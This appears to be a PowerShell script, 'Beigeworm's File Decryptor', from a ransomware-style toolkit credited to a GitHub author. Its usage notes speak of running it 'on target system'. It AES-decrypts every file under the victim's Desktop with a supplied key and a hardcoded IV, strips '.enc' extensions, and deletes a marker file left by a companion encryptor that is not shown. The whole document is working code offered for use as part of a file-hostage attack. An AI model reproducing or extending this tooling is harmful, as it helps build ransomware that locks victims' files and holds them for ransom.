<#=================================================== Beigeworm's File Decryptor =======================================================

SYNOPSIS
This script Decrypts all files within selected folders and allows the popup window to be closed.

**WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**

RUNNING THIS WITH THE WRONG KEY MAY PERMANENTLY DAMAGE THE FILES TO BE RECOVERED.

**WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   

USAGE
1. Run the script on target system.
2. Enter the Decryption Key when prompted.
3. Use the decryptor to decrypt the files.

#>

# Setup for the console
$Host.UI.RawUI.BackgroundColor = "Black"
Clear-Host
$width = 80
$height = 30
[Console]::SetWindowSize($width, $height)
$windowTitle = "Beigeworm`'s Decryptor"
[Console]::Title = $windowTitle
Write-Host "
 ___                                _                  ___  __    __    __   
(  _ \                             ( )_              / _  )  _ \/  _ \/  _ \ 
| | ) |  __    ___ _ __ _   _ _ _  |  _)  _   _ __  (_)_) | ( ) | ( ) | ( ) |
| | | )/ __ \/ ___)  __) ) ( )  _ \| |  / _ \(  __)  _(_ (| | | | | | | | | |
| |_) |  ___/ (___| |  | (_) | (_) ) |_( (_) ) |    ( )_) | (_) | (_) | (_) |
(____/ \____)\____)_)   \__  |  __/ \__)\___/(_)     \____)\___/ \___/ \___/ 
                       ( )_| | |                                             
                        \___/(_)                                             "
Write-Host "
===============================================================================
           Written by @beigeworm - Follow on github - Discord : egieb
==============================================================================="
Write-Host "`nYou will need a deryption key to recover the files..`n"

# Define Folders to Decrypt 
$SourceFolder = "$env:USERPROFILE\Desktop" #,"$env:USERPROFILE\Documents","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive"
$files = Get-ChildItem -Path $SourceFolder -File -Recurse

# Ask for decryption Key
$KeyBase64 = Read-Host "Enter Decryption Key"

# Decryption setup
$IVBase64 = 'r7SbTffTMbMA4Zm70iHAwA=='
$KeyBytes = [System.Convert]::FromBase64String($KeyBase64)
$IVBytes = [System.Convert]::FromBase64String($IVBase64)

# Decrypt all files with the key
Get-ChildItem -Path $SourceFolder -File -Recurse | ForEach-Object {
    $File = $_
    $Decryptor = [System.Security.Cryptography.Aes]::Create()
    $Decryptor.Key = $KeyBytes
    $Decryptor.IV = $IVBytes

    $Content = [System.IO.File]::ReadAllBytes($File.FullName)
    $DecryptedContent = $Decryptor.CreateDecryptor().TransformFinalBlock($Content, 0, $Content.Length)

    [System.IO.File]::WriteAllBytes($File.FullName, $DecryptedContent)
}

# Loop through each file and rename it to remove ".enc" if it's at the end
foreach ($file in $files) {
    $newName = $file.Name -replace "\.enc$", ""
    if ($newName -ne $file.Name) {
        $newPath = Join-Path -Path $SourceFolder -ChildPath $newName
        Rename-Item -Path $file.FullName -NewName $newName
    }
}

# Clean up and wait for user to close
Write-Host "`nDecryption complete for files in $SourceFolder`n"
rm -Path "$env:tmp\indicate" -Force
pause
